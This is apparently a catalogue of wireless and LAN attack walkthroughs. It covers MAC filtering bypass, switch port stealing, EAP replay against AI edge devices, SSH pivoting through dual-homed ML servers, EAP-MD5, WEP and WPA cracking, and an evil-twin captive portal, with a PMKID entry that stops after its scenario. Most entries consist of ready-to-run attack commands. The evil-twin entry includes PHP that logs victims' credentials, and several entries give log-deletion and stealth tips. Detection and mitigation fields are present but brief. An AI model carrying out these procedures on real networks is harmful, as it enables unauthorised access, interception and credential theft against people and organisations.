## MAC Spoofing (MAC Bypass)

- **Attack Type**: Identity Spoofing / MAC Filtering Bypass
- **Target**: - Corporate LAN- Wi-Fi networks with MAC-based access- Hotels, universities, guest networks
- **Vulnerability**: - MAC address-based security is trivially bypassed - No secondary authentication - Network trusts MAC identity
- **MITRE**: T1595 – Active ScanningT1586 – Compromise InfrastructureT1557 – Man-in-the-Middle
- **Impact**: - Unauthorized network access - Bypass of NAC/Wi-Fi captive portals - Launchpad for internal attacks - Potential data exfil or sniffing
- **Tools**: ✅ Kali Linux or Parrot OS✅ macchanger✅ ifconfig or ip✅ airodump-ng (optional for Wi-Fi)✅ Wireshark✅ Ethernet or Wi-Fi card (with monitor mode for Wi-Fi)
- **Scenario**: This simulation demonstrates how attackers bypass MAC address filtering by spoofing a legitimate MAC address. Many corporate or public networks restrict access by allowing only whitelisted MAC addresses (e.g., in hotel Wi-Fi, campus networks, corporate LANs). An attacker can sniff for authorized MACs, clone one, and gain network access — even without credentials. It’s often the first step in internal attacks like MITM, ARP poisoning, or network enumeration.
- **Attack Steps**: ### 🟢 STEP 1: Understand the Target Environment✅ Scenario: MAC filtering is enforced on Wi-Fi or LAN (wired)✅ Access is granted only to registered MACs➡️ You’re an external attacker with physical or nearby access➡️ Goal is to sniff authorized MACs and clone one---### 🟢 STEP 2: Monitor the Network to Discover Valid MACs#### For Wired Networks:Use ARP scan to discover devices:sudo arp-scan --interface=eth0 --localnetOutput:plaintext\n192.168.1.10 00:11:22:33:44:55 Dell Inc.\n✅ Save this MAC address: 00:11:22:33:44:55#### For Wi-Fi (Monitor Mode Required):1. Enable monitor mode:sudo airmon-ng start wlan0 → becomes wlan0mon2. Start sniffing:sudo airodump-ng wlan0mon✅ Look for connected clients:Station: 00:11:22:33:44:55 under BSSID → target MAC---### 🟢 STEP 3: Disconnect Original Device (Optional)To avoid MAC conflict, you can deauth the legit user (Wi-Fi only):sudo aireplay-ng -0 5 -a <router_BSSID> -c 00:11:22:33:44:55 wlan0mon✅ This sends deauthentication frames to target---### 🟢 STEP 4: Spoof Your MAC AddressFirst, bring interface down:sudo ip link set eth0 downChange MAC:sudo macchanger -m 00:11:22:33:44:55 eth0Bring interface up:sudo ip link set eth0 up✅ Verify:macchanger -s eth0ifconfig eth0 → check new MAC---### 🟢 STEP 5: Request IP from NetworkRun DHCP client:sudo dhclient eth0✅ You should now receive an IP address from networkRun:ip a → confirm IP addressping 8.8.8.8 → test internet➡️ You're now inside the MAC-filtered network---### 🟢 STEP 6: Post-Access EnumerationNow that you're on the network:• Run nmap -sn 192.168.1.0/24 → discover other devices• Use smbclient, ftp, ssh for lateral movement• Setup MITM or ARP spoofing🧠 Tip: Many captive portals trust whitelisted MACs and skip login---### 🟢 STEP 7: Optional Dataset Collection• Use Wireshark to record spoofed sessionsudo wireshark → filter eth.addr == 00:11:22:33:44:55• Save .pcap file for training ML/NDR toolsLabel:mac_spoof_bypass, unauthorized_lan_access---### 🛑 STEP 8: Cleanup• Restore original MAC:sudo macchanger -p eth0• Stop monitor mode: airmon-ng stop wlan0mon• Delete DHCP leases/logs✅ Be stealthy: Avoid triggering MAC conflict alerts✅ Red Team Tip: Combine with ARP spoof to steal traffic
- **Detection**: - Monitor for duplicate MACs on network - Use 802.1X (certificate-based NAC) - Alert on MAC spoof detection by switch logs or NAC - Analyze DHCP logs for MAC/IP anomalies
- **Solution**: - Do NOT rely on MAC filtering alone - Implement 802.1X / RADIUS - Use endpoint auth + posture check - Alert on abnormal MAC usage - Periodically rotate authorized MACs - Monitor for sudden changes in MAC/IP mapping
- **Tags**: #MACSpoofing #NetworkAccessControl #Bypass #WiFiHack #ARPScan #RedTeam #InitialAccess #8021X

## Session Hijacking (Switch Port Stealing)

- **Attack Type**: Layer 2 Switch Port Attack
- **Target**: Corporate LANsSwitched internal networksIoT LAN segmentsCampus labs
- **Vulnerability**: - Layer 2 trust model - Switch MAC table poisoning - No port security - MAC flooding not rate-limited
- **MITRE**: T1557.002 – ARP SpoofingT1586.001 – MAC Address SpoofingT1040 – Network Sniffing
- **Impact**: - Traffic redirection - Session takeover - Credential theft (NTLM, cookies) - Full MITM - Possible RCE or lateral movement
- **Tools**: ✅ Kali Linux (Attacker)✅ Wireshark✅ macchanger✅ arpspoof or ettercap✅ Switch (Layer 2)✅ Victim host (Windows/Linux)✅ nping, arping (for ARP control)✅ Optional: Bettercap for automation
- **Scenario**: This simulation demonstrates how attackers use switch port stealing to hijack sessions or access on switched Ethernet networks by sending crafted ARP frames. Switches associate MAC addresses to physical ports. An attacker can rapidly spoof the victim’s MAC address, causing the switch to update its MAC table, effectively redirecting traffic meant for the victim to the attacker. This enables session hijacking, credential theft, and man-in-the-middle (MITM) attacks on local networks.
- **Attack Steps**: ### 🟢 STEP 1: Lab Setup (Kali + Victim + Switch)• Connect Kali (attacker) and Victim (Windows/Linux) to the same Layer 2 switch (e.g., via Ethernet or VM host bridge)• Get Victim IP and MAC:ip a or arp -a from victim sideExample:• Victim IP: 192.168.1.10• Victim MAC: 00:11:22:33:44:55---### 🟢 STEP 2: Observe Normal Switch BehaviorFrom Kali:• Run Wireshark• Start pinging victim:ping 192.168.1.10➡️ Packets go normally through switch➡️ Switch MAC table maps victim's MAC to its port---### 🟢 STEP 3: Begin Switch Port StealingWe’ll now spoof victim’s MAC so the switch believes it moved to attacker’s portStep A: Change attacker MAC to victim’s:sudo ip link set eth0 downsudo macchanger -m 00:11:22:33:44:55 eth0sudo ip link set eth0 upStep B: Send lots of ARP traffic as victim:sudo arping -I eth0 -c 50 192.168.1.1➡️ This causes switch to overwrite its MAC table and map 00:11:22:33:44:55 to attacker’s port✅ You’ve now “stolen” the switch port---### 🟢 STEP 4: Hijack Live Session or MITMNow traffic intended for victim (e.g., RDP, SSH, HTTP cookies) is redirected to attackerOptions:1. Capture credentials via Wireshark:• Filter: tcp.port == 3389 (RDP), http, ftp• Export credentials from HTTP POSTs or NTLM challenge2. Use ettercap or bettercap:sudo ettercap -T -q -i eth0 -M arp:remote /victimIP/ /gatewayIP/✅ This enables full MITM — DNS hijacking, SSL stripping, etc.3. Observe stolen session:• Reuse cookies/tokens to hijack web sessions• Replay captured credentials for lateral movement---### 🟢 STEP 5: Optional Automation via Bettercapsudo bettercap -iface eth0Commands:bash\nset arp.spoof.targets 192.168.1.10\narp.spoof on\ndns.spoof on\nhttp.proxy on\n✅ You now fully hijack traffic from victim---### 🟢 STEP 6: Dataset Creation (for ML/Detection)1. Record .pcap of port stealing traffic2. Log spoofed MACs, ARP flood rate3. Label:• layer2_hijack\n• arp_spoof\n• switch_port_steal\nUse for NDR and anomaly-based detection models---### 🛑 STEP 7: Cleanup• Restore real MAC:sudo macchanger -p eth0• Stop arpspoof / ettercap• Restart network interfaces on both ends• Inform blue team (if red team activity)🧠 Tips:• Works best on unmanaged or dumb switches• For advanced setups, combine with DHCP starvation + rogue DHCP for full control• Chain with responder for NTLM relay post-hijack
- **Detection**: - Enable port security with max MAC bindings - Monitor for frequent MAC changes - Alert on duplicate MACs on different ports - Use NAC with 802.1X - Monitor ARP anomalies - Use dynamic ARP inspection on managed switches
- **Solution**: - Implement port security (limit MAC per port) - Deploy 802.1X / NAC - Enable dynamic ARP inspection - Segment networks with VLANs - Disable unused switch ports
- **Tags**: #SwitchPortStealing #ARPspoof #Layer2Attack #MITM #MACCloning #InternalThreat #RedTeam #SessionHijack

## Rogue Supplicant Emulation (EAP Replay / Emulation)

- **Attack Type**: Wireless Replay & Emulation Attack on AI Agents
- **Target**: AI/ML Edge Devices with Wi-Fi
- **Vulnerability**: Weak EAP handling, no replay protection
- **MITRE**: T1557 – Adversary-in-the-Middle
- **Impact**: Credential capture, AI agent hijack, data tampering
- **Tools**: Wireshark, Aircrack-ng, EAPHammer, hcxdumptool, hcxpcapngtool, Kali Linux
- **Scenario**: Attackers emulate legitimate 802.1X supplicants or replay EAP packets over wireless networks (e.g., WPA2-Enterprise) to hijack or impersonate AI devices that auto-connect to Wi-Fi networks, compromising agent communication or triggering misclassified behavior.
- **Attack Steps**: Step 1: Set up a wireless interface in monitor mode using tools like airmon-ng start wlan0. Ensure your system is compatible with monitor mode (e.g., via Kali Linux or a supported USB Wi-Fi adapter). Step 2: Use hcxdumptool to scan and capture all 802.1X EAP authentication packets being exchanged between client devices (AI agents, laptops, etc.) and the RADIUS server (via APs). This can be done using the command hcxdumptool -i wlan0mon -o eap.pcapng --enable_status=15. Let it run for a few minutes to collect multiple handshakes and EAP messages. Step 3: Convert the captured .pcapng file into a standard .pcap file for analysis using hcxpcapngtool. This allows you to inspect packets in Wireshark or replay them later. Step 4: Open the .pcap file in Wireshark and locate EAP-Response Identity and EAP-Request Identity frames. This will give you the MAC address, SSID, and supplicant identity (e.g., "ai-agent-001@company.com"). Step 5: Set up EAPHammer to launch a rogue Access Point that mimics the real one (same SSID). Use eaphammer --interface wlan0 --essid CorpNet --creds --wpa2 --channel 6. This will broadcast a fake enterprise network. Step 6: Replay or inject captured EAP-Identity requests or responses using tools like eapol_test or custom scapy scripts to impersonate the legitimate AI device. You can craft replayed EAP responses to confuse the backend or RADIUS server. Step 7: If the backend is poorly configured (e.g., accepts repeated EAP-Responses or does not validate replay protection), it may mistakenly accept the rogue device or log in the attacker. Step 8: If the AI agent is configured to auto-join trusted SSIDs without verifying server certs (common in embedded ML edge devices), it may connect to the rogue AP. You now have a man-in-the-middle position. Step 9: Use a packet sniffer to capture and inspect any outbound traffic from the AI agent, such as model updates, inference requests, or telemetry. Step 10: Optionally, spoof inference queries or manipulate responses to influence ML model behavior (e.g., model drift, poisoned input). Step 11: Clean up and disconnect rogue AP after capturing desired data. Analyze captured results. This attack can fully compromise AI agent behavior or expose ML telemetry.
- **Detection**: Monitor wireless logs for duplicate identities, sudden rogue APs, or unexpected MAC addresses
- **Solution**: Enforce mutual TLS and proper 802.1X certificate validation on AI devices; configure replay protection; disable auto-connect to trusted SSIDs
- **Tags**: EAP Replay, Wi-Fi MITM, AI Agent Spoofing, Wireless Emulation

## Bridge Connection via Authenticated Host (Dual NIC Pivoting)

- **Attack Type**: Internal Network Pivoting via AI Host
- **Target**: AI/ML Servers (Dual NIC Hosts)
- **Vulnerability**: Misconfigured dual-homed machine
- **MITRE**: T1570 – Lateral Movement via Network Tunneling
- **Impact**: Full access to internal ML infra, dataset theft, model exfiltration
- **Tools**: nmap, proxychains, netstat, Responder, SSH
- **Scenario**: Attacker abuses an AI server with two network interfaces (e.g., public + private subnet) to pivot from a public network into an internal ML infrastructure.
- **Attack Steps**: Step 1: Attacker identifies an AI/ML host (e.g., inference server or notebook interface like Jupyter) that is internet-facing and reachable on port 22 (SSH), 443, or 8888. Step 2: Through open-source intelligence or scanning, attacker finds that the host is dual-homed (has two NICs): one on a public network and another on a private subnet where internal ML APIs or GPU servers live. Step 3: Attacker authenticates to the public-facing host—either via stolen credentials, weak passwords (like admin:admin), or social engineering/phishing to gain SSH or web login. Step 4: After gaining shell access or a terminal on the public-facing AI host, attacker confirms network interfaces using ip addr, ifconfig, or netstat -rn. They discover two networks (e.g., eth0 on 10.x.x.x and eth1 on 192.168.x.x). Step 5: Attacker now attempts to reach internal IPs using ping or nmap -sP 192.168.1.0/24. If live hosts are found, attacker knows the AI host can reach internal devices not exposed publicly. Step 6: Using nmap, attacker scans internal IPs like 192.168.1.10 for open ports used by model-serving frameworks (TensorFlow Serving, TorchServe), databases (MySQL, MongoDB), and ML APIs. Step 7: Once an internal service is found (e.g., MLFlow UI at 192.168.1.23:5000), attacker sets up SSH local port forwarding using: ssh -L 5000:192.168.1.23:5000 user@ai-host. Now the local port 5000 maps to the internal ML service. Step 8: Attacker opens http://localhost:5000 on their browser and accesses the internal service as if it were local. This can include sensitive dashboards, experiment logs, or model endpoints. Step 9: Alternatively, attacker sets up SOCKS proxy using: ssh -D 9050 user@ai-host, then configures browser or tools (like proxychains) to route through the proxy and scan/exploit internal services. Step 10: Attacker can now laterally move to other systems, exploit vulnerable ML stacks (e.g., insecure API endpoints, RCE in model upload features), or exfiltrate datasets/models. Step 11: For persistence, attacker may drop SSH keys in ~/.ssh/authorized_keys, create new users, or install cronjobs/backdoors on the AI host. Step 12: This pivoting works because dual-NIC hosts are rarely monitored as routers, yet they silently bridge public and internal networks when misconfigured or left unmanaged.
- **Detection**: Monitor for port forwarding and SSH tunnel patterns; log internal traffic from public IP origins
- **Solution**: Block SSH forwarding/tunneling; isolate AI hosts via VLANs; enforce firewalls between interfaces; monitor dual-NIC routing activity
- **Tags**: ML Inference Server, Pivoting, Dual NIC Exploit

## Exploit Weak EAP Protocols (EAP-MD5)

- **Attack Type**: Wireless Authentication Bypass / MITM
- **Target**: Corporate Wi-Fi WPA-Enterprise (EAP-MD5)Legacy 802.1X Infrastructure
- **Vulnerability**: - Use of EAP-MD5 instead of EAP-TLS/PEAP- No server-side certificate validation- No credential lockout on failures
- **MITRE**: T1557.002 – Network Sniffing (EAP Hash Capture)T1110 – Brute Force / Dictionary AttackT1040 – Network Traffic Capture
- **Impact**: - Credentials theft (username/password)- Unauthorized Wi-Fi access- Lateral movement inside corporate network- Network pivoting- Data exfiltration
- **Tools**: ✅ Kali Linux (attacker)✅ USB Wi-Fi adapter (monitor mode + injection)✅ hostapd-wpe (hostapd w/ EAP support)✅ asleap (dictionary brute force tool)✅ Wireshark (optional)✅ Wordlist (rockyou.txt)✅ Wireless client (Windows/macOS/Linux) configured for WPA-Enterprise EAP-MD5
- **Scenario**: This attack simulates exploiting weak EAP authentication methods like EAP-MD5 used in WPA-Enterprise (802.1X). EAP-MD5 is insecure because it sends a challenge hash without encrypting the actual password, making it vulnerable to dictionary attacks. The attacker sets up a rogue RADIUS/EAP server to capture client authentication attempts and brute force the password offline. This is commonly seen in poorly configured corporate Wi-Fi environments or older network devices. Once the credentials are cracked, the attacker can fully authenticate to the legitimate wireless network.
- **Attack Steps**: ### 🟢 STEP 1: Lab Setup• Use Kali Linux as attacker• Connect USB Wi-Fi adapter (supports monitor mode and injection)• Use a second device (victim) configured to auto-connect to a WPA-Enterprise network using EAP-MD5---### 🟢 STEP 2: Install Required ToolsOn Kali:sudo apt install hostapd-wpe asleap aircrack-ng✅ hostapd-wpe is a patched version of hostapd that allows EAP credential capture---### 🟢 STEP 3: Configure hostapd-wpeEdit config file hostapd-wpe.conf:ini\ninterface=wlan0\ndriver=nl80211\nssid=CorpNet-Secure\nhw_mode=g\nchannel=6\nauth_algs=1\nieee8021x=1\neap_server=1\neap_user_file=eap_user\n`radius_server_clients=hostapd-wpe.conf`\nEdit eap_user file to support EAP-MD5:ini\n* MD5 "password" [2]\n✅ This sets up rogue AP with EAP-MD5 enabled---### 🟢 STEP 4: Start Rogue APsudo hostapd-wpe hostapd-wpe.conf✅ The rogue AP starts broadcasting SSID CorpNet-SecureWait for client to connect:• When the victim tries to connect, hostapd-wpe logs the username and MD5 challenge hashSample output:[*] Username: john.doe[*] Challenge: abcdef1234[*] Response: 1a2b3c4d5e...---### 🟢 STEP 5: Crack the EAP-MD5 Hash with asleapUse the captured challenge & response:asleap -C abcdef1234 -R 1a2b3c4d5e -W /usr/share/wordlists/rockyou.txtIf password is in the wordlist, you get:Found password for john.doe: password123✅ Now you can authenticate to the real corporate Wi-Fi network---### 🟢 STEP 6: Connect to Legitimate Network• Use cracked credentials in your device’s network settings• Join actual CorpNet-Secure SSID if present🧠 If the original AP uses the same SSID, devices may roam back to real AP---### 🟢 STEP 7: Optional – Lateral Movement• After connecting, scan subnet:nmap -sn 192.168.1.0/24• Use cracked credentials for SMB, RDP, VPN• Combine with phishing or privilege escalation---### 🛑 STEP 8: Cleanup• Stop hostapd-wpe:sudo pkill hostapd• Delete logs, disable adapter:sudo ifconfig wlan0 down• Clear Wi-Fi profile from victim if it auto-saved🧠 This attack requires no cracking during capture, only brute force afterwards using passive EAP-MD5 challenge
- **Detection**: - Monitor RADIUS/EAP logs for rogue auth attempts- Wireless IDS for fake APs- Alert on multiple failed EAP attempts- SIEM rules for suspicious login behavior- Inspect logs for hostapd-wpe signatures
- **Solution**: - Avoid using EAP-MD5 or other weak EAP types- Use EAP-TLS or PEAP with mutual cert validation- Enforce server certificate checks on clients- Disable auto-connect to open/weak networks- Train users to report unusual SSIDs- Deploy 802.1X with secure backend (RADIUS + MFA)
- **Tags**: #EAPMD5 #WPAEnterpriseBypass #RogueAP #WirelessMITM #hostapdWPE #asleap #RADIUSExploit

## WEP Cracking (Legacy Encryption)

- **Attack Type**: Wi-Fi Encryption Cracking (Legacy)
- **Target**: Legacy Wi-Fi NetworksUnmaintained RoutersOlder IoT or Surveillance Systems
- **Vulnerability**: - Use of WEP instead of WPA/WPA2- Predictable and short IVs (24-bit)- No replay protection- Static shared keys
- **MITRE**: T1040 – Network Traffic CaptureT1557.002 – ARP Spoofing / InjectionT1003 – Credential Access (if credentials intercepted post-access)
- **Impact**: - Full network access- Wi-Fi password disclosure- MITM attack capabilities- Sniffing unencrypted traffic- Launch internal attacks on LAN
- **Tools**: ✅ Kali Linux or Parrot OS (Attacker)✅ Wi-Fi adapter supporting monitor mode & injection (e.g., Alfa AWUS036NHA)✅ aircrack-ng suite (airodump-ng, aireplay-ng, aircrack-ng)✅ Target wireless router using WEP✅ Optional: Wireshark (for packet inspection)✅ Wordlist (optional)
- **Scenario**: This simulation demonstrates the cracking of WEP (Wired Equivalent Privacy), a deprecated and insecure Wi-Fi encryption protocol. WEP relies on RC4 stream cipher with weak Initialization Vectors (IVs). These IVs repeat frequently and are sent in plaintext. Attackers capture a large number of IVs and then use statistical attacks to recover the encryption key. Once cracked, the attacker can decrypt Wi-Fi traffic or fully connect to the network. Despite being obsolete, WEP is still seen in older routers, legacy IoT devices, or unmaintained corporate setups.
- **Attack Steps**: ### 🟢 STEP 1: Prepare the Environment• Use Kali Linux or Parrot OS• Plug in compatible USB Wi-Fi adapter• Ensure it's recognized: iwconfig → shows wlan0• Kill interfering services:sudo systemctl stop NetworkManagersudo systemctl stop wpa_supplicant---### 🟢 STEP 2: Enable Monitor Modesudo airmon-ng start wlan0✅ This creates wlan0mon interface---### 🟢 STEP 3: Scan for WEP Networkssudo airodump-ng wlan0monLook for Encryption: WEP in the listNote:• BSSID (MAC address)• Channel (e.g., 6)• ESSID (SSID name)---### 🟢 STEP 4: Start Packet Capture on Target WEP APsudo airodump-ng --bssid <BSSID> -c <channel> -w wepcrack wlan0mon✅ This saves packets to wepcrack.cap---### 🟢 STEP 5: Optional – Accelerate IV Collection (ARP Replay Attack)Open new terminal:sudo aireplay-ng -3 -b <BSSID> -h <your_MAC> wlan0mon• This injects ARP packets into the network to stimulate traffic• You must wait for a client to be connected🧠 Tip: Use sudo aireplay-ng -1 0 -a <BSSID> wlan0mon to fake-auth with AP✅ Watch as #Data increases rapidly in airodump---### 🟢 STEP 6: Crack the WEP KeyOnce #Data > 5000 (ideally > 20,000 for 128-bit WEP):sudo aircrack-ng wepcrack.capAircrack-ng will attempt key recovery using statistical methods:KEY FOUND! [ 12:34:56:78:90 ]✅ This is the WEP key used by the router---### 🟢 STEP 7: Connect to the Cracked Network• Use another device or your Kali GUI• Choose the SSID and enter the cracked WEP keyNow you have full network access like any legitimate client---### 🟢 STEP 8: Post-Exploitation (Optional)• Scan subnet with nmap -sn 192.168.1.0/24• Look for admin panels: nmap -p80,443 <targetIP>• Access devices with default credentials or vulnerable services---### 🛑 STEP 9: Cleanup• Stop monitor mode:sudo airmon-ng stop wlan0mon• Restart services:sudo systemctl start NetworkManager✅ Delete capture files if needed: rm wepcrack*🧠 Note: WEP is so weak that this attack works in minutes if traffic is present
- **Detection**: - Use wireless IDS (WIDS) to detect high IV count or injection- Alert on deauthentication and replay patterns- Monitor airspace for WEP SSIDs- Correlate ARP storm anomalies
- **Solution**: - Retire WEP immediately- Use WPA2 or WPA3 with strong PSK or 802.1X- Disable legacy modes on routers- Segment IoT on isolated VLANs- Enforce regular AP audits
- **Tags**: #WEPcrack #LegacyWiFi #AircrackNG #80211Attack #PacketInjection #ARPReplay #RedTeamWiFi #WirelessPentest

## WPA/WPA2 Handshake Capture + Offline Cracking

- **Attack Type**: Wi-Fi Credential Harvest + Offline Attack
- **Target**: Home RoutersOffice Wi-FiCafésLegacy Corporate WPA2 PSK Setups
- **Vulnerability**: - Weak passwords- No client isolation- Reuse of public SSID with known key- No detection for deauth frames
- **MITRE**: T1040 – Network Traffic CaptureT1110.001 – Brute Force: Password GuessingT1557 – Man-in-the-Middle
- **Impact**: - Full Wi-Fi access- Network pivoting- MITM injection- Internal resource access- Client compromise- Credential sniffing- Lateral movement possibilities
- **Tools**: ✅ Kali Linux (or Parrot OS)✅ USB Wi-Fi adapter (monitor mode capable – e.g., Alfa AWUS036NHA)✅ aircrack-ng suite✅ hcxdumptool and hashcat (optional)✅ Wordlist (e.g., rockyou.txt, custom lists)✅ Wireless client actively connected to WPA/WPA2 network✅ Wireshark (optional)
- **Scenario**: This simulation demonstrates how an attacker captures the 4-way handshake used in WPA/WPA2-PSK Wi-Fi networks and performs offline brute-force or dictionary attacks to recover the Wi-Fi password. Unlike WEP, WPA/WPA2 doesn't expose passwords directly. However, during the authentication handshake (when a client connects), hashed keying material is exchanged. If an attacker captures this handshake and the SSID is known, they can try millions of password guesses offline without alerting the network. Common in targeted attacks on homes, small offices, cafés, or poorly secured corporate APs.
- **Attack Steps**: ### 🟢 STEP 1: Setup Lab Environment• Kali Linux VM or bare metal• Attach Wi-Fi adapteriwconfig should show wlan0 or similar✅ Use supported adapter (supports monitor & injection)---### 🟢 STEP 2: Kill Interfering Servicessudo airmon-ng check kill✅ Ensures NetworkManager or wpa_supplicant don’t interfere---### 🟢 STEP 3: Enable Monitor Modesudo airmon-ng start wlan0 → creates wlan0mon---### 🟢 STEP 4: Scan Wi-Fi Networkssudo airodump-ng wlan0monIdentify:• ESSID (network name)• BSSID (MAC of AP)• CH (Channel)✅ Note these values---### 🟢 STEP 5: Start Handshake Capturesudo airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0monThis writes packets to capture.cap---### 🟢 STEP 6: Force Client Reconnect (Handshake Trigger)Open new terminal:sudo aireplay-ng -0 5 -a <BSSID> wlan0mon• Sends 5 deauthentication frames• Forces client(s) to reconnect✅ When client re-associates, a 4-way handshake is captured by airodump-ng• Look for [WPA handshake: <BSSID>] in top-right---### 🟢 STEP 7: Crack the Handshake with WordlistUse Aircrack-ng:aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> capture.capAircrack checks each password in the wordlist by simulating the handshake✅ If successful:KEY FOUND! [ passw0rd123 ]---### 🟢 STEP 8: Optional – Use Hashcat for SpeedConvert .cap to .hccapx:cap2hccapx capture.cap capture.hccapxThen run:hashcat -m 2500 capture.hccapx rockyou.txt --force✅ Hashcat is GPU-accelerated and much faster for large dictionaries---### 🟢 STEP 9: Connect to NetworkUse the cracked PSK on any device✅ Full access to LAN, internet, local shares---### 🟢 STEP 10: Optional Post-Exploitation• Scan subnet with nmap -sn 192.168.1.0/24• Look for vulnerable devices, exposed web UIs• Try default passwords on printers, cameras, routers• Access shared folders or attempt lateral movement---### 🛑 STEP 11: Cleanup• Stop monitor mode:sudo airmon-ng stop wlan0mon• Restart services:sudo systemctl restart NetworkManager• Delete capture files:rm capture*🧠 Tips:• Capture works even without internet• The attack is stealthy after deauth• Only works when clients are connected
- **Detection**: - Wireless IDS/IPS (WIDS/WIPS) detecting handshake capture or deauth attempts- Alert on multiple failed authentications- Monitor for deauth storms or spoofed MACs
- **Solution**: - Enforce WPA3 or WPA2-Enterprise (802.1X)- Use strong, long PSKs- Enable client isolation- Disable broadcast SSID in public areas- Rotate keys regularly- Train users not to reconnect to spoofed SSIDs
- **Tags**: #WPAHandshake #WiFiCracking #AircrackNG #Hashcat #WirelessPentest #80211 #DeauthAttack #RedTeamWiFi

## Evil Twin Attack (Fake AP + Captive Portal)

- **Attack Type**: Wi-Fi Credential Theft / Social Engineering
- **Target**: Public Wi-Fi Users<brCorporate Environments<brSchools and Cafés
- **Vulnerability**: - No SSID verification- No certificate pinning- Auto-connect to known networks- Users trust captive portals- Poor client awareness

- **Impact**: - Theft of enterprise or personal credentials- Unauthorized network access- Session hijacking- Internal compromise- Phishing for VPN/email/SSO
- **Tools**: ✅ Kali Linux or Parrot OS✅ Wi-Fi adapter with AP mode (e.g., Alfa AWUS036NHA)✅ hostapd or airgeddon (for AP setup)✅ dnsmasq or lighttpd / apache2✅ iptables, php, sslstrip✅ Captive portal template (HTML/PHP login page)✅ Optional: Bettercap, Wireshark, EvilAP, Wifiphisher
- **Scenario**: This simulation demonstrates a classic Evil Twin Attack, where the attacker sets up a rogue access point (AP) that mimics a legitimate Wi-Fi network. When users connect to the fake AP, they are served a captive portal (login page clone) prompting for credentials (e.g., corporate, school, or email credentials). Victims are tricked into submitting credentials which are captured and logged by the attacker. This attack is effective in airports, cafés, universities, and offices where users expect a captive portal. The attack works even on WPA2-PSK networks if deauthentication is used to kick victims off the real AP, and many reconnect automatically to the stronger rogue signal.
- **Attack Steps**: ### 🟢 STEP 1: Lab Preparation• Use Kali Linux as the attacker machine• Use an external USB Wi-Fi adapter that supports AP mode• Ensure no network manager interference:sudo systemctl stop NetworkManagersudo rfkill unblock all---### 🟢 STEP 2: Identify Target Wi-Fi Network• Scan with sudo airodump-ng wlan0mon• Find the target SSID (e.g., "CorpNet")• Note BSSID, channel, encryption---### 🟢 STEP 3: Deauthenticate Real Users (Optional)• Force clients to disconnect from real AP:sudo aireplay-ng -0 5 -a <BSSID> wlan0mon✅ Users will attempt to reconnect — many auto-connect to strongest signal---### 🟢 STEP 4: Set Up Fake AP (Evil Twin)Using airgeddon or manually:• Install tools:sudo apt install hostapd dnsmasq apache2• Create hostapd.conf:ini\ninterface=wlan0\ndriver=nl80211\nssid=CorpNet\nhw_mode=g\nchannel=6\nauth_algs=1\nignore_broadcast_ssid=0\n• Start AP:sudo hostapd hostapd.conf✅ Fake AP is now broadcasting "CorpNet" on same channel---### 🟢 STEP 5: Configure DHCP and DNS• Create dnsmasq.conf:ini\ninterface=wlan0\ndhcp-range=10.0.0.10,10.0.0.100,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\ndhcp-authoritative\naddress=/#/10.0.0.1\n• Start DHCP:sudo dnsmasq -C dnsmasq.conf✅ All DNS queries are redirected to local web server---### 🟢 STEP 6: Set Up Captive Portal• Create a fake login page using HTML/PHP• Save as /var/www/html/index.phpExample fake form:html\n<form method="POST" action="login.php">\n<input name="username">\n<input name="password" type="password">\n<input type="submit">\n</form>\nCreate login.php to capture and log credentials:php\nfile_put_contents('creds.txt', $_POST['username'] . ':' . $_POST['password'] . \"\\n\", FILE_APPEND);\n✅ Web server now logs all submitted credentials---### 🟢 STEP 7: Enable IP Forwarding and Firewall Redirectssudo sysctl -w net.ipv4.ip_forward=1sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADEOptional: Use iptables to redirect HTTP/HTTPS to local captive portal---### 🟢 STEP 8: Victim Connects• Victim connects to "CorpNet"• Any URL they open redirects to captive portal• Victim enters username/password✅ Credentials logged in creds.txt---### 🟢 STEP 9: Optional Enhancements• Use Bettercap for real-time credential logging• SSLstrip to downgrade HTTPS• Serve fake VPN, email, or SSO login screens---### 🛑 STEP 10: Cleanup• Stop services:sudo pkill hostapd dnsmasq apache2• Clear logs: rm creds.txt• Restart networking:sudo systemctl restart NetworkManager🧠 Tip: Works well in public Wi-Fi spaces with captive portal expectations
- **Detection**: - Use WIDS to detect rogue APs broadcasting same SSID- Alert on duplicate SSID with different MAC- Monitor captive portal traffic and DNS hijacking- Browser warnings on invalid certs
- **Solution**: - Train users to verify captive portal domains- Enforce VPN before login- Use WPA2-Enterprise with cert validation- Block MACs of fake APs- Disable auto-connect to open or known networks
- **Tags**: #EvilTwin #FakeAP #CaptivePortal #PhishingOverWiFi #CredentialHarvesting #Airgeddon #Wifiphisher

## PMKID Attack (No Client Needed)

- **Attack Type**: Offline WPA2 PSK Cracking (Clientless)
- **Target**: Home Wi-Fi Routers<brPublic Hotspots<brCorporate WPA2-PSK Networks
- **Vulnerability**: - Misconfigured WPA2 routers- PMKID leak in RSN handshake- No rate-limiting for PMKID requests- Weak Wi-Fi passwords
- **MITRE**: T1040 – Network Traffic CaptureT1110.001 – Brute Force (Dictionary Attack)T1557 – Man-in-the-Middle
- **Impact**: - Wi-Fi password theft- Full access to target network- Device or service compromise- LAN snooping, scanning, attacks- Potential lateral movement
- **Tools**: ✅ Kali Linux (or Parrot OS)✅ USB Wi-Fi Adapter with monitor mode (e.g., Alfa AWUS036ACH)✅ hcxdumptool (for PMKID capture)✅ hcxpcapngtool (to convert capture file)✅ hashcat (for offline cracking)✅ Wordlist (e.g., rockyou.txt, custom dictionary)✅ Optional: airodump-ng for initial recon
- **Scenario**: The PMKID attack targets WPA2-PSK networks that use 802.11r (fast roaming) or certain misconfigurations. Unlike traditional handshake cracking, this method does not require any connected clients or deauthentication attacks. Instead, the attacker passively requests a PMKID (Pairwise Master Key Identifier) directly from the Access Point (AP). If successful, the PMKID can be captured and then brute-forced offline to recover the Wi-Fi password. This method is stealthy, fast, and extremely useful in environments with no active clients. Most consumer routers are vulnerable unless patched or WPA3-only.
